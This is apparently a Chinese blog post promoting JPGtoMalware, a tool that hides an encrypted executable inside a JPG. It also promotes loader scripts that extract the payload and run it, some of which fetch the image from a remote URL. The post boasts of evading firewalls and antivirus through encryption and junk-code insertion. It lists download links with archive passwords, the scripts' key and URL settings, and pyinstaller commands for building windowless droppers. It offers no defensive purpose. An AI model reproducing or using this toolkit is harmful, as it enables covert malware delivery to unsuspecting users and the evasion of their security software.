hi，大家好，我是fhoenix42s

![](https://image.3001.net/images/20220602/1654174240_6298b22009dd5d4b59964.jpg!small)

它将可执行文件或有效负载嵌入到 jpg 文件中。 程序使用的方法并不完全称为隐写术方法之一[安全封面选择、最低有效位、基于调色板的技术等]。
因此，它不会导致 JPG 文件出现任何失真。 JPG 文件大小和有效负载不必成比例。JPG 文件可以在任何查看应用程序或 Web 应用程序中正常显示。
它可以绕过各种安全程序，如防火墙、杀毒软件。 如果对文件进行详细检查，它比隐写方法更容易检测到。但是，由于 JPG
文件中的有效载荷是加密的，因此不容易解密。 它还使用“垃圾代码插入/死代码插入”方法来防止有效负载在运行时被防病毒软件捕获。

![](https://image.3001.net/images/20220602/1654174257_6298b23148fa5d73fc98b.png!small)

 **文件**

 **1) InjectingMalwareIntoJPG.py ：** 它是将有效负载嵌入到 JPG 文件中的脚本。

 **2）malware_v1.py ：** 它是提取现有图像文件中的恶意软件并运行它的脚本。 恶意软件加载的 JPG 文件必须位于同一文件夹中。 （默认
JPG 名称：“malwareJPG.jpg”）

 **3）malware_v2.py：** 是从网上下载的JPG文件中提取恶意软件并运行的脚本。 （默认Url：“
[https://raw.githubusercontent.com/abdulkadir-gungor/JPGtoMalware/main/.image/malwareJPG.jpg
](https://raw.githubusercontent.com/abdulkadir-gungor/JPGtoMalware/main/.image/malwareJPG.jpg)”）（脚本代码编译后，变量的值可以用静态的程序分析。）

 **4）malware_v3.py：** 是从网上下载的JPG文件中提取恶意软件并运行的脚本。 （默认Url：“
[https://raw.githubusercontent.com/abdulkadir-gungor/JPGtoMalware/main/.image/malwareJPG.jpg
](https://raw.githubusercontent.com/abdulkadir-gungor/JPGtoMalware/main/.image/malwareJPG.jpg)”）（脚本代码编译后，动态分析可以看到变量的值的程序。）

    InjectingMalwareIntoJPG.rar --> 压缩包密码：“gungorX”
    链接 = [https://drive.google.com/file/d/1ENt-d0q-Yv-4mZALiUwqvZtp23JH415s/view?usp=sharing ](https://drive.google.com/file/d/1ENt-d0q-Yv-4mZALiUwqvZtp23JH415s/view?usp=sharing)

“恶意软件 V1”

    
    malware_v1.rar --> 压缩包密码：“gungorX”
    链接 = [https://drive.google.com/file/d/1kG2O2pKYxHz03zWpmywA-9CluSP7Orav/view?usp=sharing ](https://drive.google.com/file/d/1kG2O2pKYxHz03zWpmywA-9CluSP7Orav/view?usp=sharing)

“恶意软件 V2”

    
    malware_v2.rar --> 压缩包密码：“gungorX”
    链接 = [https://drive.google.com/file/d/1yxvb3BjH3Xi3vbE7VTyBDeWGhr8v3cSX/view?usp=sharing ](https://drive.google.com/file/d/1yxvb3BjH3Xi3vbE7VTyBDeWGhr8v3cSX/view?usp=sharing)

“恶意软件 V3”

    
    malware_v3.rar --> 压缩包密码：“gungorX”
    链接 = <https://drive.google.com/file/d/1f_JQSrKTknlTg31rDeKOF3NpAVN9NO3C/view?usp=sharing>
    
    
    pip install colorama
    pip install cryptography
    pip install requests
    pip install pyinstaller

 **InjectingMalwareIntoJPG.py（默认设置）**

    
    
    class SETTINGS():
        PROGRAM_NAME = "Injecting Malware Into JPG"         # Program Name
        JPG_FILE = 'linux.jpg'                              # Jpg file name      # The variable is changed again during the program run.
        EXE_FILE = "malware.exe"                            # Malware file name  # The variable is changed again during the program run.
        OUT_FILE = "malwareJPG.jpg"                         # Out file name
        PUPLIC_KEY = b'!AbdUlkadiR%+39608]gunGor[{'         # Encryption key
        PRIVATE_NUMBER = 19                                 # Encryption number
        BUFFER     = 1024                                   # Buffer for memory optimization
        FILL_SIZE  = 1073741824  # 1024x1024x1024 (1 GB)    # The size to increase the size of the executable file.
        WAIT_TIME  = 0.1                                    # Waiting time between processes
    

**恶意软件v1.py（默认设置）**

    
    
    class SETTINGS():
        JPG_NAME = 'malwareJPG.jpg'                       # Jpg file name
        OUT_FILE = "malware_test.exe"                     # (to be created) Malware file name
        PUPLIC_KEY = b'!AbdUlkadiR%+39608]gunGor[{'       # Encryption key
        PRIVATE_NUMBER = 19                               # Encryption number
        BUFFER     = 1024                                 # Buffer for memory optimization
        WAIT_TIME  = 0.1                                  # Waiting time between processes
    

**恶意软件v2.py（默认设置）**

    
    
    class SETTINGS():
        URL_ADDR = "https://raw.githubusercontent.com/abdulkadir-gungor/JPGtoMalware/main/.image/malwareJPG.jpg"  # url where the image is located
        OUT_FILE = "malware_test.exe"                       # (to be created) Malware file name
        PUPLIC_KEY = b'!AbdUlkadiR%+39608]gunGor[{'         # Encryption key
        PRIVATE_NUMBER = 19                                 # Encryption number
        JPG_NAME  = 'malware_attack.jpg'                    # Jpg file name
        BUFFER     = 1024                                   # Buffer for memory optimization
        WAIT_TIME  = 0.1                                    # Waiting time between processes
    

**恶意软件v3.py（默认设置）**

    
    
    # Encrypted data for static analysis
    # However, variables can be resolved with dynamic analysis.
    class SETTINGS():
        KEY      = b'w3F4q2qyPG6WGHMwG6TrYq2R_ih9-_XTYH0H89J7UMk='
        URL_ADDR = b'gAAAAABiinQIPIhKqfLYaKt76lRXeboIJfCDr0NGsGROzSLe3ndeSo9RxM-EXNzsxFjwC-sU3axowzYaZCgsSfMl4qe4rWGaLbmNY0zD6_S34lOO10a_idkEQpfVSld0BSM7Yd4LXpgH6Fvkuw36QVlzmI_NvQJ6v5_mgEmCIzhSbiuMHJ-p9hdj28-2cMRa1BcFWZBbbRe7'
        OUT_FILE = b'gAAAAABiinRLcZh6qJ959Mzqup5ZLOnGwAQBAFPXD6hebpSpI4u3M24Npi3lIbTjW5ImEYwiz6WfD8JOyrcDzjR5gpTun4pI0gPHjf-xi_LSboOy5B7hwXo='
        PUPLIC_KEY = b'rt!1AtbydmUklvkaapdli+R)%=+4359?6#0!8-][gGu1nFGqoQrP[-{!Ue&&QcVb09@'
        PRIVATE_NUMBER = 4
        JPG_NAME  = b'gAAAAABiinSMlx2n6LSUzHfrET4UDnv_Fy7lc7h9zAKsC6p9ulM56yW0nXarAWvU2nmZqdNscglA9MLr2P3p20ADC3CWZsul4-YnfDiIFl13tZUnZ_BdDRU='
        BUFFER     = 1024
        WAIT_TIME  = 0.1
    
    
    
    # [Program that produces jpg with malware]
    pyinstaller --onefile  --icon=InjectingMalwareIntoJPG.ico InjectingMalwareIntoJPG.py
    
    # [Malware(s)]
    pyinstaller --onefile  --noconsole  --icon=malware.ico  malware_v1.py
    pyinstaller --onefile  --noconsole  --icon=malware.ico  malware_v2.py
    pyinstaller --onefile  --noconsole  --icon=malware.ico  malware_v3.py

![](https://image.3001.net/images/20220602/1654174461_6298b2fd8aefca3ba065e.png!small)

![](https://image.3001.net/images/20220602/1654174468_6298b304be04826c496b3.png!small)然后打开dist目录

![](https://image.3001.net/images/20220602/1654174609_6298b391069a1612858f4.png!small)

![](https://image.3001.net/images/20220602/1654174619_6298b39b0500e1314526b.png!small)顺便找一张图片

![](https://image.3001.net/images/20220602/1654174640_6298b3b0e8037c2debe03.png!small)运行![](https://image.3001.net/images/20220602/1654174664_6298b3c89252b9998cc24.png!small)成功，发现图片变大了吗

![](https://image.3001.net/images/20220602/1654174692_6298b3e40cd1bc5061746.png!small)ok，就这样，去忙了，拜拜

https://github.com/abdulkadir-gungor/JPGtoMalware

![](https://image.3001.net/images/20220602/1654174719_6298b3ff54483ab4a67ab.jpg!small)

